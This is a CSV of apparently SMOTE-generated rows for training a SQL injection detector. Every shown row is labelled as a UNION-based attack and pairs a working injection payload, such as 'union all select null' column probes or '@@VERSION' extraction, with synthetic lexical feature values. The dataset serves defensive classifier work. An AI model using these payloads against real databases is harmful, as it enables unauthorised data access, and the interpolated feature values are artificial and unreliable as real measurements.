id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000372,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000017,0.3493989375795401,64.63834151430693,20.783004908584157,3.6301772098043736,13.999999999999998,35.71067321144554,3.999999999999999,10.927668302861385,0.2166828766153085,0.5523624267253617,0.061909393318659564,0.16904530334067022,-5.551115123125783e-17,1.0,1.1446633942772293,0.0,0.0,0.0,0.0,0.0,0.9276683028613854,0.0,6.9276683028613855,1.1446633942772293,0.0,1.0,0.07233169713861465,0.9276683028613855,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000373,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000021,1.5248839531849634,57.4790072498748,19.6197518124687,3.7167173879513804,13.999999999999998,26.7604963750626,7.098759062343501,9.6197518124687,0.24452926363686944,0.46938386656044684,0.1190521556794786,0.167034714123205,-5.551115123125783e-17,1.0,3.0,0.0,0.0,0.0,0.0,0.6197518124687004,0.30987590623435013,0.0,4.690124093765649,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.30987590623435024,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000374,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000011,0.48667964425442123,73.0,25.48312060307598,4.039080925716974,41.24156030153799,8.436359296411357,15.161040201025326,8.161040201025326,0.5649528808429862,0.11556656570426516,0.2076854822058264,0.11179507124692227,0.9194798994873365,0.0,2.0,0.0,0.16104020102532668,1.0,0.0,0.9194798994873367,0.0,0.0,1.9194798994873365,4.080520100512663,0.9194798994873367,0.0,1.0,0.0,0.0,1.0,0.9194798994873367,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.08052010051266334,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.080520100512663
SMOTE_000375,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000001,0.0360477382273401,73.02773688011047,32.0,4.362862963877544,44.0,2.0,17.0,10.027736880110469,0.6025168177671487,0.02738712808032495,0.23279058868276198,0.1373054654697643,-5.551115123125783e-17,0.0,2.0,0.0,1.0138684400552345,1.0,0.0,0.0,0.0,0.0,1.0,5.027736880110469,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000376,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000006,2.984994026735463,76.83917430905461,26.64536041816626,4.02190758269468,40.45154652727791,5.70927916366748,19.387627781776693,11.29072083633252,0.5278350599006933,0.07623712502846483,0.25046390640991084,0.145463908660931,2.0969069454441733,0.0,2.0,0.0,0.5484534727220867,1.0,0.0,1.5484534727220867,0.0,0.0,1.4515465272779133,4.548453472722087,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.5484534727220867,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.548453472722087
SMOTE_000377,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000001,1.8321507733694642,73.0,32.43315290280693,4.378732398007678,43.13369419438614,2.4331529028069294,17.0,10.43315290280693,0.590872523210769,0.033330861682286717,0.2328767123287671,0.1429199027781771,-5.551115123125783e-17,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.4331529028069293,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.433152902806929
SMOTE_000378,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000010,0.1590621955715644,56.0,16.937734960231037,3.3012562346060905,38.249060159075846,1.0,7.750939840924152,9.0,0.6830189314120687,0.01785714285714285,0.13840964001650272,0.16071428571428573,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9377349602310382,1.0,0.0,5.0622650397689615,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.9377349602310382,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000379,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000029,1.0759768844029234,70.23546508771689,20.579159217274324,3.6873425082015245,13.999999999999998,35.36672626180541,9.737477651822973,11.131261174088515,0.20086475161097994,0.4979439831335677,0.14326309825723632,0.15792816699821607,-5.551115123125783e-17,1.0,1.0,0.0,0.0,0.0,0.0,1.289579608637162,0.0,0.0,6.841681565451351,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000380,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000008,1.3965920843147008,60.15869032691535,19.0,3.6585682212612167,13.999999999999998,32.12695226153228,3.999999999999999,10.03173806538307,0.23578658062939872,0.53052962213783,0.06736759446554248,0.16631620276722875,0.3439126884610234,0.6560873115389766,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.03173806538307,3.0,0.3439126884610234,0.6560873115389766,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000381,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000001,0.4130982807301955,73.0,32.0,4.363397135789541,43.804438737340064,2.09778063132997,17.0,10.09778063132997,0.6000608046210967,0.028736720977122876,0.2328767123287671,0.13832576207301328,-5.551115123125783e-17,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.09778063132996993,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.09778063132997
SMOTE_000382,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000026,2.089961130085031,57.608548946103525,21.53618298203451,3.856282004819854,13.999999999999998,24.289463856276072,10.782902107792946,8.536182982034509,0.24318411463515455,0.42010865527523894,0.18865703171639092,0.1480501983732156,0.463817017965491,0.536182982034509,1.0,0.0,0.0,0.0,0.0,1.463817017965491,0.0,0.0,4.072365964069018,1.0,0.46381701796549096,0.536182982034509,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000383,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000008,1.3894722217172435,61.24866753194142,18.553666604861327,3.6312505737526455,13.999999999999998,33.356000741664076,3.999999999999999,9.892666790277346,0.2314937166147088,0.5406106323839696,0.06614106188991681,0.1617545891114048,-5.551115123125783e-17,0.5536666048613268,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.339000185416019,3.0,0.0,0.5536666048613268,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000384,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000017,1.4516485098538974,68.36016464638053,20.626648372624388,3.64104306849003,13.999999999999998,37.49340650950245,5.493406509502455,11.373351627375614,0.20560451038475522,0.5488784814652725,0.07892531487154625,0.16659169327842602,-5.551115123125783e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.3733516273756139,0.6266483726243862,0.0,7.373351627375614,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.3733516273756138,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000385,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000021,0.18527742110106898,55.569646564138374,19.0,3.664506392304498,13.999999999999998,28.455717251310695,3.999999999999999,9.113929312827674,0.2524740124940423,0.5114582714353801,0.07213543214115493,0.16393228392942252,0.0379764376092247,0.9620235623907752,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.113929312827674,3.0,0.037976437609224756,0.9620235623907752,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000386,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000026,1.5472193957410865,61.62195647982446,21.68902176008777,3.803860751260284,13.999999999999998,24.0,14.0,9.621956479824465,0.22724241719553928,0.38955842947806735,0.22724241719553928,0.15595673613085406,-5.551115123125783e-17,1.0,1.6219564798244652,0.0,0.0,0.0,0.0,2.0,0.3109782399122326,0.0,4.0,1.6219564798244652,0.0,1.0,0.3109782399122326,0.6890217600877675,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000387,attack,union,"1%' union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000016,1.53332897395852,60.7798502026197,16.0,3.1320382456373896,45.58488765196478,1.0,3.999999999999999,10.194962550654925,0.75,0.016671664136255038,0.06668665654502015,0.16664167931872484,1.0,0.0,0.5974812753274619,0.0,0.0,0.0,0.0,0.0,1.0,0.0,6.896221912991193,0.5974812753274623,1.0,0.0,0.29874063766373093,0.7012593623362691,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000388,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000027,1.6659419212833333,64.72899563100047,18.757001456333178,3.4680834714616986,22.70098980566776,14.095756917582591,18.0,9.932248907750116,0.33697606991056067,0.23024057025657507,0.28000855123332397,0.1527748085995403,-5.551115123125783e-17,0.31074963591670574,2.6892503640832945,0.0,0.0,0.0,0.0,3.0,0.0,0.0,3.932248907750117,2.689250364083294,0.0,0.31074963591670574,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000389,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000017,1.7354501677874101,61.59409362805689,20.318818725611376,3.647767971690207,13.999999999999998,33.27527490244551,3.999999999999999,10.318818725611377,0.22872243054746955,0.5386029365171776,0.06534926587070557,0.1673253670646472,-5.551115123125783e-17,1.0,1.6811812743886225,0.0,0.0,0.0,0.0,0.0,0.6594093628056887,0.0,6.3188187256113775,1.6811812743886225,0.0,1.0,0.34059063719431126,0.6594093628056887,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000390,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000021,2.151689760366889,56.83700961366369,20.377757210247765,3.8075435309970573,13.999999999999998,28.0,5.837009613663686,9.0,0.24661998934012586,0.4932399786802517,0.10159861026097011,0.15854142171865235,-5.551115123125783e-17,1.0,2.081495193168157,0.0,0.0,0.0,0.0,0.45925240341592166,0.0,0.0,5.0,2.0814951931681565,0.0,1.0,0.5407475965840784,0.45925240341592166,0.0,0.0,0.4592524034159217,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000391,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000009,1.4366466145891192,57.773459961073755,21.08009497080532,3.880083655153788,13.999999999999998,28.0,6.773459961073757,9.0,0.24257983375807932,0.4851596675161587,0.11631631988128247,0.15594417884447956,-5.551115123125783e-17,1.0,1.6132700194631213,0.0,0.0,0.0,0.0,0.6933649902684393,0.0,0.0,5.0,1.613270019463121,0.0,1.0,0.30663500973156066,0.6933649902684393,0.0,0.0,0.6933649902684393,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000392,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000006,1.0755021012383759,79.00052533232795,28.571128381526883,4.07816639254877,40.28556419076344,3.0,22.143307427709676,13.571653713854838,0.5107575551314995,0.03801342876763977,0.27970077252966286,0.17152824357119786,2.571653713854838,0.0,2.0,0.0,1.0,1.0,0.0,1.7144358092365586,0.0,0.0,1.0,5.0,0.8572179046182793,0.0,1.0,0.0,0.0,1.0,0.8572179046182793,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.1427820953817207,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.142782095381721
SMOTE_000393,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000024,1.4153320755925964,57.610934610393905,22.610934610393905,3.876356131389204,26.082009577954295,11.139859642833517,15.610934610393906,4.778130779212188,0.4513668262992383,0.19446226840849717,0.2708310509964729,0.08333985429579163,0.1945326948030469,0.8054673051969531,0.19453269480304702,0.0,0.0,0.8054673051969531,0.0,1.1945326948030468,0.0,0.0,0.5835980844091413,1.0,0.19453269480304688,0.8054673051969531,0.0,1.0,0.0,0.8054673051969531,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.8054673051969531,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.805467305196953
SMOTE_000394,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000010,1.0976273943604349,56.0,16.570332767533024,3.2509911241005978,39.7186689298679,1.0,6.281331070132103,9.0,0.7092619451762124,0.01785714285714285,0.11216662625235897,0.16071428571428573,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5703327675330256,1.0,0.0,5.429667232466974,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.5703327675330256,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000395,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000025,0.5689866625128787,69.1449828364186,20.710034327162795,3.551205833542773,13.999999999999998,40.0,3.999999999999999,11.144982836418603,0.20247831061907653,0.5785094589116472,0.057850945891164726,0.16116128457811157,1.0,0.0,1.2899656728372066,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,1.2899656728372066,1.0,0.0,0.1449828364186032,0.8550171635813968,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000396,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000025,1.9545856024699673,69.0,19.732552443461778,3.5579415998038866,13.999999999999998,40.0,3.999999999999999,11.0,0.2028985507246377,0.5797101449275363,0.05797101449275363,0.15942028985507245,0.5775174811539254,0.0,1.8449650376921491,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,1.8449650376921491,0.5775174811539253,0.0,0.4224825188460745,0.5775174811539254,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000397,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000027,1.2606894891030593,61.54359894142319,20.271799470711596,3.6686974085113087,13.999999999999998,21.08719788284638,16.912802117153618,9.54359894142319,0.22752787270884084,0.3422969274070167,0.2752787270884084,0.154896472795734,-5.551115123125783e-17,0.27179947071159505,3.0,0.0,0.0,0.0,0.0,2.728200529288405,0.2717994707115949,0.0,3.2717994707115947,3.0,0.0,0.27179947071159505,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000398,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000011,1.4138099284717338,70.9654066291292,24.41868760832263,3.9639761323617324,39.25606282496789,9.0,14.709343804161316,8.0,0.5525344363695224,0.12708828151470258,0.20740992076937276,0.11296736134640231,0.709343804161315,0.29065619583868507,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.290656195838685,3.709343804161315,0.7093438041613149,0.29065619583868507,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.709343804161315,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.709343804161315
SMOTE_000399,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000031,1.4340529228157957,66.71435424885233,19.342870849770467,3.650971429294789,13.999999999999998,37.37148339908187,3.999999999999999,11.342870849770465,0.21095215250382557,0.5589118257099136,0.06027204357252158,0.1698639782137392,0.6714354248852328,0.3285645751147672,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.342870849770465,3.0,0.6714354248852328,0.3285645751147672,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000400,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000001,0.15071073840752458,73.11596415997671,32.0,4.364380141945829,44.0,2.0,17.0,10.11596415997671,0.6018077766138858,0.027354898936994804,0.23251664096445587,0.1383206834846635,-5.551115123125783e-17,0.0,2.0,0.0,1.0579820799883546,1.0,0.0,0.0,0.0,0.0,1.0,5.115964159976709,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000401,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000030,2.524096123601766,67.35013712249611,17.88328762583463,3.3697449440367118,28.81698661915759,9.945616222714492,18.0,10.587534280624027,0.41251611588898884,0.1616168531631848,0.2694133240051808,0.15645370694264554,-5.551115123125783e-17,0.5291780935413426,2.4708219064586574,0.0,0.0,0.0,0.0,3.0,0.0,0.0,4.587534280624028,2.4708219064586574,0.0,0.5291780935413426,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000402,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000015,1.013263775420774,69.7419386021015,20.258061397898498,3.6685141966955874,13.999999999999998,40.0,3.999999999999999,11.741938602101502,0.20074800405187973,0.5735657258625134,0.05735657258625135,0.1683296974993555,1.0,0.0,2.4838772042030026,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,2.4838772042030026,1.0,0.0,0.7419386021015013,0.25806139789849875,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000403,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000030,0.7761005602315592,72.47191515533126,15.823971718443754,3.138900666891132,43.40822625244997,1.0,16.239717184437534,11.823971718443753,0.599800407026406,0.013801973550815805,0.22328862654950632,0.1631089928732718,-5.551115123125783e-17,0.8239717184437534,2.0,0.0,0.0,0.0,0.0,2.6479434368875068,0.0,0.0,6.352056563112493,2.0,0.0,0.8239717184437534,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
